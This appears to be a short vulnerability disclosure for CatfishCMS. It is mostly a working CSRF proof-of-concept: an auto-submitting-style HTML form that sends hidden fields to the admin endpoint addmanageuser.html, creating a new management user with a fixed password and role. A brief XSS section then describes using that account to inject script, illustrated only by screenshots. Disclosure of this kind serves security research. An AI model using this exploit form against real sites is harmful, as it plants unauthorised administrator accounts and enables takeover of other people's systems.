# catfishcms

## CSRF

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.33.62.73:8080/admin/Index/addmanageuser.html" method="POST">
      <input type="hidden" name="yonghuming" value="111111" />
      <input type="hidden" name="pwd" value="111111" />
      <input type="hidden" name="repeat" value="111111" />
      <input type="hidden" name="juese" value="6" />
      <input type="hidden" name="checkCode" value="363651540178244" />
      <input type="hidden" name="verification" value="6c357a42643449c5cb0b82114b4a5898" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
You can see the successful addition of users
![](https://github.com/AvaterXXX/catfish/blob/master/catfishcms/CSRF1.png)

-------------
## XSS
Login the newly generated account，write source code
![](https://github.com/AvaterXXX/catfish/blob/master/catfishcms/1.png)
Successfully click on the page
![](https://github.com/AvaterXXX/catfish/blob/master/catfishcms/2.png)
